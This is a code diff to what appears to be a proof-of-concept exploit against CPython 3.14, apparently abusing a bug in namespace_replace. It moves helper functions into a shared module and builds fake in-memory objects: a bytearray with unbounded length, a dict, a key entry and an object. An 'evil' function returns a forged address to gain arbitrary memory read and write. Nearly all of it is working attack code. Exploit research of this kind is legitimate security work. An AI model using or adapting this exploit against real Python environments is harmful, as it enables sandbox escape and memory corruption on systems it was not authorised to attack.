@@ -44,10 +44,7 @@ namespace_replace(PyObject *self, PyObject *args, PyObject *kwargs)
 
 # WARNING: A lot of fake structs need to be built, prepare yourself
 
-i2f = lambda num: 5e-324 * num
-p64 = lambda num: num.to_bytes(8, 'little')
-p32 = lambda num: num.to_bytes(4, 'little')
-p8 = lambda num: num.to_bytes(1, 'little')
+from common import evil_bytearray_obj, addrof_bytes, i2f, p64, p32, p8
 
 KEY = "my_awesome_key" # can be whatever string you want
 
@@ -58,29 +55,20 @@ class Catch:
         mem = self.mem
         return True
 
-# helper function to get the address of the start of a fake object
-fid = lambda obj: id(obj) + bytes.__basicsize__ - 1
-
-fake_ba = (
-    p64(0x12345) +
-    p64(id(bytearray)) +
-    p64(2**63 - 1) +
-    p64(2**63 - 1) +
-    p64(0) +
-    p64(0)
-)
+# see ./common/common.py for evil bytearray obj explanation
+fake_ba, ba_addr = evil_bytearray_obj()
 
 fake_obj = (
     p64(0x1111) +
     p64(id(Catch)) +
-    p64(fid(fake_ba))
+    p64(ba_addr)
 )
 
 # PyDictKeyEntry
 # https://github.com/python/cpython/blob/v3.14.0/Include/internal/pycore_dict.h#L74-L79
 fake_key = (
     p64(hash(KEY) % 2**64) + # me_hash
-    p64(fid(fake_obj)) +     # me_key
+    p64(addrof_bytes(fake_obj)) +     # me_key
     p64(0)                   # me_value (unused in this case)
 )
 
@@ -106,7 +94,7 @@ fake_dict = (
     p64(id(dict)) +       # ob_base
     p64(1) +              # ma_used
     p64(0) +              # _ma_watcher_tag
-    p64(fid(fake_keys)) + # ma_keys
+    p64(addrof_bytes(fake_keys)) + # ma_keys
     p64(0)                # ma_values
 )
 
@@ -142,7 +130,7 @@ typedef struct {
 # is what the `evil` method below implements
 
 def evil(*unused):
-    obj_addr = fid(fake_dict)
+    obj_addr = addrof_bytes(fake_dict)
     return 0j + i2f(obj_addr)
 
 # We have to create the object first then set the __new__ func or else calling `broken` will
